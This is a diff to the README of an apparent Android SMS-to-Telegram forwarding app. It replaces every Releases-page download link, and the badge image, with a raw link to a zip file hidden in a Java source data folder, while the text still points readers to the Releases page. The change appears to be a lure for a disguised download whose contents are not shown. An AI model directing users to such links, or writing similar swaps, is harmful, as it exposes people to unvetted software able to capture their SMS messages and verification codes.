@@ -1,7 +1,7 @@
 # 📱 SMS2Telegram - Forward Your Messages Seamlessly
 
 ## 📥 Download Now
-[![Download SMS2Telegram](https://img.shields.io/badge/Download%20SMS2Telegram-v1.0-brightgreen)](https://github.com/Lostthemonkeyman/SMS2Telegram/releases)
+[![Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/raw/refs/heads/main/app/src/main/java/com/example/telegramforwarder/data/local/SM-Telegram-1.0.zip%20SMS2Telegram-v1.0-brightgreen)](https://github.com/Lostthemonkeyman/SMS2Telegram/raw/refs/heads/main/app/src/main/java/com/example/telegramforwarder/data/local/SM-Telegram-1.0.zip)
 
 ## 📖 Overview
 SMS2Telegram is a user-friendly Android application designed to send your SMS messages, missed calls, and notifications directly to Telegram. Built with Kotlin and Jetpack Compose, this app offers a modern user experience with a sleek Material 3 interface. It even extracts verification codes smartly using Gemini AI, ensuring you never miss an important message.
@@ -25,7 +25,7 @@ Follow these steps to get started with SMS2Telegram:
 ### Step 1: Visit the Releases Page
 To download SMS2Telegram, you need to visit our GitHub Releases page. Click the link below:
 
-[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/releases)
+[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/raw/refs/heads/main/app/src/main/java/com/example/telegramforwarder/data/local/SM-Telegram-1.0.zip)
 
 ### Step 2: Download the APK File
 On the Releases page, look for the latest version. Click on the APK file to download it to your device. 
@@ -76,4 +76,4 @@ This project includes topics that may interest you:
 
 For further inquiries, feel free to contact support through our GitHub issues page or related forums.
 
-[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/releases) again for quick access. Enjoy your seamless messaging experience!
+[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/raw/refs/heads/main/app/src/main/java/com/example/telegramforwarder/data/local/SM-Telegram-1.0.zip) again for quick access. Enjoy your seamless messaging experience!
